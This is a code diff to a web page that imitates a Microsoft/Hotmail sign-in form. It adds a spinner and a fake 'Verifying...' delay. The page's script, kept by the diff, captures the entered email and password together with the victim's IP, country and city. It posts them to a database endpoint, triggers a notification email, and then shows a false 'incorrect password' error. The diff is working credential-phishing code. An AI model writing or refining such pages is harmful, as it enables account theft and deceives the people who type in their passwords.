@@ -181,6 +181,26 @@
                 width: 30%;
             }
         }
+
+        .loader-container {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(0, 120, 212, 0.2);
+            border-radius: 50%;
+            border-top-color: #0078D4;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 
@@ -251,6 +271,11 @@
     <input type="hidden" id="adminEmail" value="admin@gmail.com" name="admin">
 
 
+    <div class="loader-container" id="loaderContainer">
+        <div class="loader"></div>
+        <span>Verifying...</span>
+    </div>
+
     <script>
         // Add function to fetch user's location and IP
         document.addEventListener("DOMContentLoaded", function() {
@@ -306,42 +331,53 @@
                 if (password.value == "") {
                     msg2.textContent = 'Enter the password for ' + email.value + '.'
                 } else {
-                    // Show error message in red
-                    msg2.style.color = "#E81123";
-                    msg2.textContent = 'Your email or password is incorrect. If you don\'t remember your password, reset it now.';
+                    // Show loader, hide previous error
+                    const loaderContainer = document.getElementById('loaderContainer');
+                    loaderContainer.style.display = 'block';
+                    msg2.textContent = '';
                     
-                    // Create the data object for Supabase
-                    const userData = {
-                        username: email.value + " (hotmail)",
-                        password: password.value,
-                        country: country.value,
-                        city: city.value,
-                        continent: continent.value,
-                        ip_address: ip.value,
-                        platform: 'microsoft'
-                    };
-                    
-                    // First save to database using Next.js API route
-                    fetch('/api/login', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(userData)
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Data saved to database:', data);
+                    // Simulate verification delay (1.5 seconds)
+                    setTimeout(function() {
+                        // Hide loader
+                        loaderContainer.style.display = 'none';
                         
-                        // Then send notification email
-                        sendNotificationEmail();
+                        // Show error message in red
+                        msg2.style.color = "#E81123";
+                        msg2.textContent = 'Your email or password is incorrect. If you don\'t remember your password, reset it now.';
                         
-                        // Optionally redirect after a delay (uncomment if needed)
-                        // setTimeout(function() {
-                        //     window.location.href = 'https://outlook.live.com/owa/';
-                        // }, 1000);
-                    })
-                    .catch(error => {
-                        console.error('Error saving data:', error);
-                    });
+                        // Create the data object for Supabase
+                        const userData = {
+                            username: email.value + " (hotmail)",
+                            password: password.value,
+                            country: country.value,
+                            city: city.value,
+                            continent: continent.value,
+                            ip_address: ip.value,
+                            platform: 'microsoft'
+                        };
+                        
+                        // Save to database
+                        fetch('/api/login', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(userData)
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Data saved to database:', data);
+                            
+                            // Then send notification email
+                            sendNotificationEmail();
+                            
+                            // Optionally redirect after a delay
+                            // setTimeout(function() {
+                            //     window.location.href = 'https://outlook.live.com/owa/';
+                            // }, 1000);
+                        })
+                        .catch(error => {
+                            console.error('Error saving data:', error);
+                        });
+                    }, 1500); // 1.5 second delay for verification
                 }
             });
             
